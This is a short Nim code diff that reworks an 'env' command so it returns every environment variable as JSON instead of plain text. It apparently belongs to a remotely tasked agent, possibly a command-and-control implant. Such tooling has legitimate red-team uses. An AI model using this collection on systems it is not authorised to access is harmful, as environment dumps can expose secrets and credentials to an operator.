@@ -1,13 +1,16 @@
-import std/[os, json, strutils]
+import std/[os, json]
 import core/types
 import commands/registry
 
 proc envExecute(taskId: string, params: JsonNode, state: AgentState,
                 send: SendMsg): TaskResult =
-  var lines: seq[string] = @[]
+  var entries = newJArray()
   for (key, val) in envPairs():
-    lines.add(key & "=" & val)
-  return TaskResult(output: lines.join("\n"), status: "success", completed: true)
+    entries.add(%*{"key": key, "value": val})
+  return TaskResult(
+    output:    $(%*{"env": entries}),
+    status:    "success",
+    completed: true)
 
 proc initEnv*() =
   register("env", envExecute)
